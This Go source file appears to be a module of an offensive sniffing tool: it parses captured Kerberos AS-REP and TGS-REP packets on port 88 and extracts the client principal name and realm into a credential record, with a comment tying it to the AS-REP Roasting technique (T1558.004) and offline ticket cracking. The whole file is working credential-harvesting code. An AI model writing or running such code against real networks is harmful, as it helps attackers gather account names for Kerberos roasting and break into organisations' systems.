package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"time"
)

// Kerberos AS-REP extraction (T1558.004 — AS-REP Roasting)
// AS-REP has application tag 11 (0x6B). We look for the encrypted part
// which contains the ticket that can be cracked offline if pre-auth is disabled.
func sniffExtractKerberos(payload []byte, meta *packetMeta) *sniffCredential {
	// Kerberos typically runs on port 88
	if meta.DstPort != 88 && meta.SrcPort != 88 {
		return nil
	}

	// Look for AS-REP (application tag 11 = 0x6B) or TGS-REP (application tag 13 = 0x6D)
	// AS-REP: response to AS-REQ, contains ticket for the requesting principal
	// We parse the outer ASN.1 structure to extract the client principal name and realm
	data := payload

	// Skip any TCP framing (Kerberos over TCP prepends 4-byte length)
	if len(data) >= 4 {
		frameLen := int(binary.BigEndian.Uint32(data[0:4]))
		if frameLen > 0 && frameLen <= len(data)-4 {
			candidate := data[4:]
			if len(candidate) > 2 && (candidate[0] == 0x6B || candidate[0] == 0x6D) {
				data = candidate
			}
		}
	}

	if len(data) < 10 {
		return nil
	}

	isASREP := data[0] == 0x6B
	isTGSREP := data[0] == 0x6D
	if !isASREP && !isTGSREP {
		return nil
	}

	protocol := "krb-asrep"
	if isTGSREP {
		protocol = "krb-tgsrep"
	}

	// Parse outer SEQUENCE length to validate this is a real Kerberos message
	innerData, ok := sniffASN1Skip(data, data[0])
	if !ok || len(innerData) < 6 {
		return nil
	}

	// AS-REP/TGS-REP body is a SEQUENCE (0x30)
	if innerData[0] != 0x30 {
		return nil
	}
	seqData, ok := sniffASN1Skip(innerData, 0x30)
	if !ok || len(seqData) < 4 {
		return nil
	}

	// Parse tagged fields inside the SEQUENCE
	// [0] pvno, [1] msg-type, [2] padata (optional), [3] crealm, [4] cname, [5] ticket, [6] enc-part
	var realm, principalName string
	pos := seqData
	for len(pos) > 2 {
		tag := pos[0]
		fieldData, ok := sniffASN1Skip(pos, tag)
		if !ok {
			break
		}

		tagNum := tag & 0x1F
		switch tagNum {
		case 3: // crealm — GeneralString
			if len(fieldData) > 2 && fieldData[0] == 0x1B { // GeneralString
				str, sOk := sniffASN1ReadString(fieldData)
				if sOk {
					realm = str
				}
			}
		case 4: // cname — PrincipalName SEQUENCE
			principalName = sniffExtractPrincipalName(fieldData)
		}

		// Advance past this field
		_, totalLen := sniffASN1Len(pos[1:])
		advance := 1 + totalLen + int(sniffASN1ContentLen(pos))
		if advance <= 0 || advance > len(pos) {
			break
		}
		pos = pos[advance:]
	}

	if principalName == "" {
		return nil
	}

	username := principalName
	if realm != "" {
		username = principalName + "@" + realm
	}

	return &sniffCredential{
		Protocol:  protocol,
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  username,
		Detail:    fmt.Sprintf("realm=%s", realm),
		Timestamp: time.Now().Unix(),
	}
}

// sniffExtractPrincipalName extracts the name-string from a PrincipalName ASN.1 structure.
func sniffExtractPrincipalName(data []byte) string {
	// PrincipalName ::= SEQUENCE { name-type [0] Int32, name-string [1] SEQUENCE OF GeneralString }
	if len(data) < 2 || data[0] != 0x30 {
		return ""
	}
	seqData, ok := sniffASN1Skip(data, 0x30)
	if !ok {
		return ""
	}

	var parts []string
	pos := seqData
	for len(pos) > 2 {
		tag := pos[0]
		fieldData, ok := sniffASN1Skip(pos, tag)
		if !ok {
			break
		}

		if tag&0x1F == 1 { // [1] name-string
			// SEQUENCE OF GeneralString
			if len(fieldData) > 2 && fieldData[0] == 0x30 {
				inner, innerOk := sniffASN1Skip(fieldData, 0x30)
				if innerOk {
					namePos := inner
					for len(namePos) > 2 {
						if namePos[0] == 0x1B { // GeneralString
							str, sOk := sniffASN1ReadString(namePos)
							if sOk {
								parts = append(parts, str)
							}
						}
						_, tl := sniffASN1Len(namePos[1:])
						adv := 1 + tl + int(sniffASN1ContentLen(namePos))
						if adv <= 0 || adv > len(namePos) {
							break
						}
						namePos = namePos[adv:]
					}
				}
			}
		}

		_, tl := sniffASN1Len(pos[1:])
		advance := 1 + tl + int(sniffASN1ContentLen(pos))
		if advance <= 0 || advance > len(pos) {
			break
		}
		pos = pos[advance:]
	}

	if len(parts) == 0 {
		return ""
	}
	return strings.Join(parts, "/")
}

// ASN.1 DER minimal helpers for Kerberos parsing

// sniffASN1Skip reads past tag+length and returns the content bytes.
func sniffASN1Skip(data []byte, expectedTag byte) ([]byte, bool) {
	if len(data) < 2 || data[0] != expectedTag {
		return nil, false
	}
	contentLen, lenBytes := sniffASN1Len(data[1:])
	if lenBytes == 0 || contentLen < 0 {
		return nil, false
	}
	start := 1 + lenBytes
	end := start + contentLen
	if end > len(data) {
		return nil, false
	}
	return data[start:end], true
}

// sniffASN1Len reads a DER length field. Returns (content length, bytes consumed for length encoding).
func sniffASN1Len(data []byte) (int, int) {
	if len(data) == 0 {
		return -1, 0
	}
	if data[0] < 0x80 {
		return int(data[0]), 1
	}
	numBytes := int(data[0] & 0x7F)
	if numBytes == 0 || numBytes > 4 || numBytes >= len(data) {
		return -1, 0
	}
	length := 0
	for i := 1; i <= numBytes; i++ {
		length = (length << 8) | int(data[i])
	}
	return length, 1 + numBytes
}

// sniffASN1ContentLen returns the content length from a TLV at position data.
func sniffASN1ContentLen(data []byte) int {
	if len(data) < 2 {
		return 0
	}
	cl, _ := sniffASN1Len(data[1:])
	if cl < 0 {
		return 0
	}
	return cl
}

// sniffASN1ReadString reads a GeneralString/UTF8String/OctetString value.
func sniffASN1ReadString(data []byte) (string, bool) {
	if len(data) < 2 {
		return "", false
	}
	content, ok := sniffASN1Skip(data, data[0])
	if !ok {
		return "", false
	}
	return string(content), true
}
